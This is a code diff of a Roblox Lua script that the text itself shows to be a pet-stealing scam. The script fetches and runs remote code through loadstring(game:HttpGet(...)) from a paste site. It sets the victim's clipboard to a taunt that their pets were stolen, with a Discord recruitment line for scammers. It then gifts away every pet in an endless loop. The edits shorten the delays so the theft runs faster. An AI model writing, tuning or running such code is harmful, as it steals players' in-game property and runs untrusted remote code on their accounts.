@@ -805,7 +805,6 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         end
         return true
     end
-
 -- Set clipboard message once
 setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
 
@@ -813,11 +812,11 @@ setclipboard("Your valuable pets have been STOLEN. If you want to scam others jo
 local followConn = safeFollow()
 
 -- Wait a moment before beginning the loop
-task.wait(2)
+task.wait(0.1)
 
 -- Begin infinite gifting loop
 while true do
-    task.wait(3)
+    task.wait(0.1)
 
     -- Always refresh pet list in case new pets appear
     local pets = GetPlayerPets()
@@ -832,9 +831,8 @@ while true do
                 else
                     warn("Failed to gift:", tool.Name)
                 end
-                task.wait(0.4) -- brief delay between gifts
+                task.wait(0.1) -- brief delay between gifts
             end
         end
     end
 end
-
